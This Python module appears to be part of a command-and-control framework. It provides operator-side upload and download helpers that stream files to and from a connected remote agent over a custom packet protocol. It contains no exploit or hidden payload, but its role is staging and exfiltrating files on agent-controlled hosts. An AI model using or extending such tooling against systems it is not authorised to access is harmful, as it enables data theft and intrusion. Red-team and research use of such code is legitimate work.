"""C2-side file transfer helpers.

Two async operations over an already-connected Agent. Both hold the
Agent's ``instruction_lock`` for the whole transfer (init packet + all
data packets + final result), so concurrent commands / other transfers on
the same Agent queue up instead of corrupting the protocol.

- ``upload(local_path, dest_path)``: send an upload init packet, then
  stream the local file in 1024-byte data packets (streaming read), then
  wait for the Agent's result response.

- ``download(src_path, download_dir)``: send a download init packet; the
  Agent's data packets are pushed by NetworkServer into
  ``info.data_queues[req_id]``. The file is streamed to
  ``download_dir / basename(src_path)`` (overwriting any existing file)
  and the saved :class:`pathlib.Path` is returned.
"""

import asyncio
import os
from pathlib import Path
from typing import Optional

from src.c2.agent_registry import AgentRegistry
from src.c2.forwarder import NetworkError
from common.protocol import (
    CMD_DOWNLOAD,
    CMD_UPLOAD,
    DATA_CHUNK_SIZE,
    END_FLAG_CONTINUE,
    END_FLAG_LAST,
    encode_data_packet,
    encode_request,
)


def _resolve_agent(registry: AgentRegistry, agent_id: Optional[str]):
    if agent_id is not None:
        return registry.get(agent_id)
    return registry.get_active()


async def upload(
    registry: AgentRegistry,
    local_path: str,
    dest_path: str,
    agent_id: Optional[str] = None,
    timeout: float = 60.0,
) -> str:
    agent = _resolve_agent(registry, agent_id)
    if agent is None:
        raise NetworkError("No active agent")
    src = Path(local_path).resolve()
    if not src.exists() or not src.is_file():
        return f"Error: local file not found: {local_path}"

    req_id = agent.allocate_request_id()
    fut: asyncio.Future = asyncio.get_running_loop().create_future()
    agent.pending[req_id] = fut
    agent.active_ops += 1
    try:
        async with agent.instruction_lock:
            async with agent.write_lock:
                init_pkt = encode_request(req_id, CMD_UPLOAD, [dest_path])
                agent.writer.write(init_pkt)
                await agent.writer.drain()

            # Streaming read: the local file is never loaded into memory.
            with open(src, "rb") as f:
                while True:
                    chunk = f.read(DATA_CHUNK_SIZE)
                    async with agent.write_lock:
                        if not chunk:
                            agent.writer.write(encode_data_packet(req_id, END_FLAG_LAST, b""))
                            await agent.writer.drain()
                            end_flag = END_FLAG_LAST
                        else:
                            end_flag = (
                                END_FLAG_CONTINUE
                                if len(chunk) == DATA_CHUNK_SIZE
                                else END_FLAG_LAST
                            )
                            agent.writer.write(encode_data_packet(req_id, end_flag, chunk))
                            await agent.writer.drain()
                    if end_flag == END_FLAG_LAST:
                        break

            return await asyncio.wait_for(fut, timeout=timeout)
    except asyncio.TimeoutError:
        raise NetworkError("upload timeout")
    except Exception as e:
        raise NetworkError(f"upload failed: {e}")
    finally:
        agent.pending.pop(req_id, None)
        agent.active_ops -= 1
        registry.touch_heartbeat(agent.id)


async def download(
    registry: AgentRegistry,
    src_path: str,
    download_dir: Optional[Path] = None,
    agent_id: Optional[str] = None,
    timeout: float = 120.0,
) -> Path:
    agent = _resolve_agent(registry, agent_id)
    if agent is None:
        raise NetworkError("No active agent")

    req_id = agent.allocate_request_id()
    # 16 MiB of buffered download data (~1 KiB per data packet).
    queue: asyncio.Queue = asyncio.Queue(
        maxsize=(16 * 1024 * 1024) // DATA_CHUNK_SIZE
    )
    agent.data_queues[req_id] = queue
    dir_path = Path(download_dir) if download_dir is not None else Path.cwd()
    try:
        dir_path.mkdir(parents=True, exist_ok=True)
    except OSError:
        pass
    dest = dir_path / os.path.basename(src_path)
    agent.active_ops += 1
    try:
        async with agent.instruction_lock:
            async with agent.write_lock:
                init_pkt = encode_request(req_id, CMD_DOWNLOAD, [src_path])
                agent.writer.write(init_pkt)
                await agent.writer.drain()

            fileobj = open(dest, "wb")  # overwrite any existing file
            try:
                while True:
                    marker, data = await asyncio.wait_for(queue.get(), timeout=timeout)
                    if marker == "error":
                        raise NetworkError(
                            f"download failed: {data.decode('utf-8', errors='replace')}"
                        )
                    if data:
                        fileobj.write(data)
                    if marker == END_FLAG_LAST:
                        break
            finally:
                fileobj.close()

        return dest
    except NetworkError:
        try:
            if dest.exists():
                dest.unlink()
        except OSError:
            pass
        raise
    except asyncio.TimeoutError:
        raise NetworkError("download: queue timeout")
    except Exception as e:
        try:
            if dest.exists():
                dest.unlink()
        except OSError:
            pass
        raise NetworkError(f"download failed: {e}")
    finally:
        agent.data_queues.pop(req_id, None)
        agent.active_ops -= 1
        registry.touch_heartbeat(agent.id)
